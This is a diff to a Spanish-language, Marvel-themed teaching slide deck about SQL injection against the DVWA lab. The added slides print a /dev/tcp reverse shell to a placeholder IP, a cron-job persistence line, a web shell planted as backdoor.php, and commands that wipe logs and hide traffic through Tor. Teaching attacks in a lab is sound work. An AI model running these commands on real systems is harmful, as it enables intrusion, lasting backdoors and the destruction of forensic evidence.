@@ -509,49 +509,63 @@
                     <span class="text">15 min</span>
                 </div>
                 <h2>⚔️ Demo SQL Injection</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">6 pasos de vulnerabilidad a explotación.</p>
+                <p style="font-size:0.62em;color:var(--text-muted)">8 pasos: de vulnerabilidad a post-explotación.</p>
                 
-                <div style="display:flex;flex-direction:column;gap:6px;margin-top:0.4em">
-                    <div style="display:flex;align-items:center;gap:10px;padding:0.4em 0.6em;background:rgba(125,207,255,0.06);border-radius:6px">
-                        <span style="font-size:1.2em">🔧</span>
+                <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:6px;margin-top:0.4em">
+                    <div style="display:flex;align-items:center;gap:8px;padding:0.3em 0.5em;background:rgba(125,207,255,0.06);border-radius:6px">
+                        <span style="font-size:1em">🔧</span>
                         <div>
-                            <p style="font-size:0.62em;color:var(--cyan);margin:0;font-weight:600">Paso 0: Setup</p>
-                            <p style="font-size:0.52em;margin:0">Levantar DVWA con Docker</p>
+                            <p style="font-size:0.55em;color:var(--cyan);margin:0;font-weight:600">Paso 0: Setup</p>
+                            <p style="font-size:0.48em;margin:0">DVWA Docker</p>
                         </div>
                     </div>
-                    <div style="display:flex;align-items:center;gap:10px;padding:0.4em 0.6em;background:rgba(158,206,106,0.06);border-radius:6px">
-                        <span style="font-size:1.2em">🔍</span>
+                    <div style="display:flex;align-items:center;gap:8px;padding:0.3em 0.5em;background:rgba(158,206,106,0.06);border-radius:6px">
+                        <span style="font-size:1em">🔍</span>
                         <div>
-                            <p style="font-size:0.62em;color:var(--green);margin:0;font-weight:600">Paso 1: Detección</p>
-                            <p style="font-size:0.52em;margin:0">Comilla simple → Error SQL</p>
+                            <p style="font-size:0.55em;color:var(--green);margin:0;font-weight:600">Paso 1: Detección</p>
+                            <p style="font-size:0.48em;margin:0">Comilla → Error SQL</p>
                         </div>
                     </div>
-                    <div style="display:flex;align-items:center;gap:10px;padding:0.4em 0.6em;background:rgba(255,158,100,0.06);border-radius:6px">
-                        <span style="font-size:1.2em">🗺️</span>
+                    <div style="display:flex;align-items:center;gap:8px;padding:0.3em 0.5em;background:rgba(255,158,100,0.06);border-radius:6px">
+                        <span style="font-size:1em">🗺️</span>
                         <div>
-                            <p style="font-size:0.62em;color:var(--orange);margin:0;font-weight:600">Paso 2: Enumeración</p>
-                            <p style="font-size:0.52em;margin:0">sqlmap --dbs --tables</p>
+                            <p style="font-size:0.55em;color:var(--orange);margin:0;font-weight:600">Paso 2: Enumeración</p>
+                            <p style="font-size:0.48em;margin:0">sqlmap --dbs</p>
                         </div>
                     </div>
-                    <div style="display:flex;align-items:center;gap:10px;padding:0.4em 0.6em;background:rgba(187,154,247,0.06);border-radius:6px">
-                        <span style="font-size:1.2em">💎</span>
+                    <div style="display:flex;align-items:center;gap:8px;padding:0.3em 0.5em;background:rgba(187,154,247,0.06);border-radius:6px">
+                        <span style="font-size:1em">💎</span>
                         <div>
-                            <p style="font-size:0.62em;color:var(--purple);margin:0;font-weight:600">Paso 3: Extracción</p>
-                            <p style="font-size:0.52em;margin:0">Dump usuarios + MD5 hashes</p>
+                            <p style="font-size:0.55em;color:var(--purple);margin:0;font-weight:600">Paso 3: Extracción</p>
+                            <p style="font-size:0.48em;margin:0">Dump usuarios + hashes</p>
                         </div>
                     </div>
-                    <div style="display:flex;align-items:center;gap:10px;padding:0.4em 0.6em;background:rgba(247,118,142,0.06);border-radius:6px">
-                        <span style="font-size:1.2em">💥</span>
+                    <div style="display:flex;align-items:center;gap:8px;padding:0.3em 0.5em;background:rgba(247,118,142,0.06);border-radius:6px">
+                        <span style="font-size:1em">💥</span>
                         <div>
-                            <p style="font-size:0.62em;color:var(--pink);margin:0;font-weight:600">Paso 4: Impacto</p>
-                            <p style="font-size:0.52em;margin:0">RCE, lectura archivos</p>
+                            <p style="font-size:0.55em;color:var(--pink);margin:0;font-weight:600">Paso 4: Impacto</p>
+                            <p style="font-size:0.48em;margin:0">RCE, lectura archivos</p>
                         </div>
                     </div>
-                    <div style="display:flex;align-items:center;gap:10px;padding:0.4em 0.6em;background:rgba(249,226,175,0.06);border-radius:6px">
-                        <span style="font-size:1.2em">🛡️</span>
+                    <div style="display:flex;align-items:center;gap:8px;padding:0.3em 0.5em;background:rgba(249,226,175,0.06);border-radius:6px">
+                        <span style="font-size:1em">🛡️</span>
                         <div>
-                            <p style="font-size:0.62em;color:var(--gold);margin:0;font-weight:600">Paso 5: Prevención</p>
-                            <p style="font-size:0.52em;margin:0">Prepared Statements</p>
+                            <p style="font-size:0.55em;color:var(--gold);margin:0;font-weight:600">Paso 5: Prevención</p>
+                            <p style="font-size:0.48em;margin:0">Prepared Statements</p>
+                        </div>
+                    </div>
+                    <div style="display:flex;align-items:center;gap:8px;padding:0.3em 0.5em;background:rgba(187,154,247,0.06);border-radius:6px">
+                        <span style="font-size:1em">🏴‍☠️</span>
+                        <div>
+                            <p style="font-size:0.55em;color:var(--purple);margin:0;font-weight:600">Paso 6: Post-Explotación</p>
+                            <p style="font-size:0.48em;margin:0">Reverse shell + Persistencia</p>
+                        </div>
+                    </div>
+                    <div style="display:flex;align-items:center;gap:8px;padding:0.3em 0.5em;background:rgba(192,192,192,0.06);border-radius:6px">
+                        <span style="font-size:1em">🕵️</span>
+                        <div>
+                            <p style="font-size:0.55em;color:var(--silver);margin:0;font-weight:600">Paso 7: Evasión</p>
+                            <p style="font-size:0.48em;margin:0">Cleanup + Disguise + Timing</p>
                         </div>
                     </div>
                 </div>
@@ -563,7 +577,7 @@
             </section>
 
             <!-- ═══════════════════════════════════════════════════════════════════ -->
-            <!-- SLIDES 9-14: DEMO SQLi (6 slides)                                   -->
+            <!-- SLIDES 9-14: DEMO SQLi (8 slides: Setup → Post-Explotación)        -->
             <!-- ═══════════════════════════════════════════════════════════════════ -->
             <section>
                 <h2>🔧 SQLi — Setup + Detección</h2>
@@ -622,6 +636,130 @@
                     <h4>🔓 Hashes crackeados</h4>
                     <p style="font-size:0.52em"><code>admin</code> → <code>password</code> | <code>gordon</code> → <code>123456</code></p>
                 </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 11B: POST-EXPLOITACIÓN — Persistencia + Evasión               -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>🏴‍☠️ SQLi — Post-Explotación</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Dr. Doom ya entró... ¿cómo se queda?</p>
+                
+                <div class="columns">
+                    <div>
+                        <p style="font-size:0.62em;color:var(--pink);font-weight:600;margin-bottom:0.2em">🐚 Reverse Shell (Conexión)</p>
+                        <div class="terminal" style="font-size:0.4em">
+                            <div class="line"><span class="comment"># 1. Tu máquina escucha</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">nc -lvnp 4444</span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># 2. SQLMap abre shell remota</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -u "..." --os-shell</span></div>
+                            <div class="line"><span class="output">os-shell> id</span></div>
+                            <div class="line"><span class="highlight">uid=33(www-data) gid=33(www-data)</span></div>
+                        </div>
+                        
+                        <div class="info-box pink" style="margin-top:0.3em">
+                            <h4>⚡ Conexión Directa</h4>
+                            <p style="font-size:0.5em"><code>bash -i >& /dev/tcp/TU_IP/4444 0>&1</code></p>
+                            <p style="font-size:0.48em;color:var(--text-muted)">Dr. Doom crea un portal directo a Latveria</p>
+                        </div>
+                    </div>
+                    <div>
+                        <p style="font-size:0.62em;color:var(--gold);font-weight:600;margin-bottom:0.2em">🏰 Persistencia (Quedarse)</p>
+                        <div class="terminal" style="font-size:0.4em">
+                            <div class="line"><span class="comment"># Web Shell (siempre accesible)</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -u "..." --file-write=shell.php \</span></div>
+                            <div class="line"><span class="command">  --file-dest=/var/www/html/backdoor.php</span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># Cron job (persistencia Linux)</span></div>
+                            <div class="line"><span class="command">echo "*/5 * * * * bash -i >& /dev/tcp/IP/4444" \</span></div>
+                            <div class="line"><span class="command">  | crontab -</span></div>
+                        </div>
+                        
+                        <div class="info-box gold" style="margin-top:0.3em">
+                            <h4>👑 Doombots = Web Shells</h4>
+                            <p style="font-size:0.5em">Pequeños programas que esperan tus órdenes</p>
+                            <p style="font-size:0.48em;color:var(--text-muted)">Doombots siempre están listos para atacar</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-box purple" style="margin-top:0.3em">
+                    <h4>⚠️ En Bug Bounty: Reportar, NO explotar</h4>
+                    <p style="font-size:0.55em">PoC = mostrar que PUEDES entrar. NUNCA installs persistentes en targets reales.</p>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 11C: EVASIÓN — Anti-forensics + Cleanup                       -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>🕵️ Post-Explotación — Evasión</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">¿Te detectaron? Dr. Strange activó el SIEM...</p>
+                
+                <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:0.3em">
+                    <div class="card" style="border-top:3px solid var(--cyan)">
+                        <p style="font-size:1.5em;text-align:center;margin:0">🧹</p>
+                        <h4 style="color:var(--cyan);text-align:center">CLEANUP</h4>
+                        <div class="terminal" style="font-size:0.38em;margin-top:0.2em">
+                            <div class="line"><span class="comment"># Borrar logs</span></div>
+                            <div class="line"><span class="command">echo "" > /var/log/apache2/access.log</span></div>
+                            <div class="line"><span class="command">echo "" > /var/log/auth.log</span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># Borrar historial</span></div>
+                            <div class="line"><span class="command">history -c && rm ~/.bash_history</span></div>
+                        </div>
+                    </div>
+                    <div class="card" style="border-top:3px solid var(--green)">
+                        <p style="font-size:1.5em;text-align:center;margin:0">🎭</p>
+                        <h4 style="color:var(--green);text-align:center">DISGUISE</h4>
+                        <div class="terminal" style="font-size:0.38em;margin-top:0.2em">
+                            <div class="line"><span class="comment"># Tor para ocultar IP</span></div>
+                            <div class="line"><span class="command">proxychains sqlmap -u "..."</span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># User-Agent falso</span></div>
+                            <div class="line"><span class="command">--random-agent</span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># Sleep entre requests</span></div>
+                            <div class="line"><span class="command">--delay=3</span></div>
+                        </div>
+                    </div>
+                    <div class="card" style="border-top:3px solid var(--orange)">
+                        <p style="font-size:1.5em;text-align:center;margin:0">⏰</p>
+                        <h4 style="color:var(--orange);text-align:center">TIMING</h4>
+                        <div class="terminal" style="font-size:0.38em;margin-top:0.2em">
+                            <div class="line"><span class="comment"># Horas bajas</span></div>
+                            <div class="line"><span class="output">2AM - 5AM (menos guardias)</span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># Pausar y reanudar</span></div>
+                            <div class="line"><span class="command">Ctrl+Z  # Pausa</span></div>
+                            <div class="line"><span class="command">bg      # Continuar bg</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:0.3em">
+                    <div class="info-box cyan">
+                        <h4>🔮 Strange detecta con...</h4>
+                        <ul style="font-size:0.52em">
+                            <li><strong>SIEM</strong> = Ojo de Agamotto (ve todo)</li>
+                            <li><strong>WAF</strong> = Barreras mágicas</li>
+                            <li><strong>IDS/IPS</strong> = Guardianes de Hong Kong</li>
+                            <li><strong>Rate Limiting</strong> = Controles de acceso</li>
+                        </ul>
+                    </div>
+                    <div class="info-box pink">
+                        <h4>🦹 Doom evade con...</h4>
+                        <ul style="font-size:0.52em">
+                            <li><strong>Tor/VPN</strong> = Portales dimensionales</li>
+                            <li><strong>Slow attacks</strong> = Movimiento sigiloso</li>
+                            <li><strong>Encoding</strong> = Poderes de shapeshifting</li>
+                            <li><strong>Doombots</strong> = Agents分散 el riesgo</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <p style="font-size:0.55em;color:var(--purple);margin-top:0.3em;font-style:italic;text-align:center">"La mejor evasión: ser más inteligente que el defensor" 🧠</p>
             </section>
 
             <section>
